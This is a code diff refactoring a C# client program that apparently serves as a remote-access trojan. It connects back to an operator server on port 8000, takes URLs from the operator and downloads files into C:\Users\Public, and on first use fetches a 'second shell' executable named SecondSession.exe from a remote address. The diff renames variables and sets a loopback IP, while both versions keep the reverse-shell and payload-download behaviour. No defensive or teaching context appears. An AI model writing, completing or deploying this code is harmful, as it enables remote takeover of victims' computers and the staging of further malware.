@@ -11,48 +11,46 @@ namespace Client
     class Program
     {
         static Socket sck = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-        static int i = 0;
+        static int shelldownloadCount = 0;
 
-        public static bool socketConnect()
+        static void socketConnect()
         {
             
-            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse("your server local or external IP"), 8000); // Server IP & PORT 
-            sck.Connect(endPoint);
-            //Console.WriteLine(sck.Connected);
-            return sck.Connected;
+            IPEndPoint connectAddress = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8000); // Server IP & PORT 
+            sck.Connect(connectAddress);
         }
 
-        public static void DownloadFile()
+        static void DownloadFile()
         {
-            WebClient webclient = new WebClient();
-            byte[] URL = Encoding.Default.GetBytes("Enter URL: ");
-            sck.Send(URL, 0, URL.Length, 0);
+            WebClient downloadFile = new WebClient();
+            byte[] requestUrl = Encoding.Default.GetBytes("Enter URL: ");
+            sck.Send(requestUrl, 0, requestUrl.Length, 0);
             byte[] urlbuffer = new byte[255];
-            int recURL = sck.Receive(urlbuffer, 0, urlbuffer.Length, 0);
-            Array.Resize(ref urlbuffer, recURL);
+            int recUrl = sck.Receive(urlbuffer, 0, urlbuffer.Length, 0);
+            Array.Resize(ref urlbuffer, recUrl);
             string url = Encoding.Default.GetString(urlbuffer);
             string replacment = Regex.Replace(url, @"\n", "");
-            webclient.DownloadFileAsync(new Uri(replacment), @"c:\Users\Public\file");
+            downloadFile.DownloadFileAsync(new Uri(replacment), @"c:\Users\Public\file");
 
           
         }
-        static void downloadSHELL()
+        static void DownloadShell()
         {
-            byte[] downloadshell = Encoding.Default.GetBytes("Downloading Second shell on port 9000\n");
-            sck.Send(downloadshell, 0, downloadshell.Length, 0);
-            WebClient webclient2 = new WebClient();
-            webclient2.DownloadFile(new Uri("www.www.www"), @"C:\Users\Public\SecondSession.exe"); //second client session enter remote address
+            byte[] downloadingMsg = Encoding.Default.GetBytes("Downloading Second shell on port 9000\n");
+            sck.Send(downloadingMsg, 0, downloadingMsg.Length, 0);
+            WebClient secondShell = new WebClient();
+            secondShell.DownloadFile(new Uri("www.www.www"), @"C:\Users\Public\SecondSession.exe"); //second client session enter remote address
         }
 
        
-        public static bool execcommand()
+        public static bool ExecuteCommand()
         {
 
 
-            if(i == 0)
+            if(shelldownloadCount == 0)
             {
-                downloadSHELL();
-                i = 1;
+                DownloadShell();
+                shelldownloadCount = 1;
             }
             
             
@@ -107,7 +105,7 @@ namespace Client
                     socketConnect();
                     while (socketDEAD != true)
                     {
-                        socketDEAD = execcommand();
+                        socketDEAD = ExecuteCommand();
                     }
                     sck.Close();
 
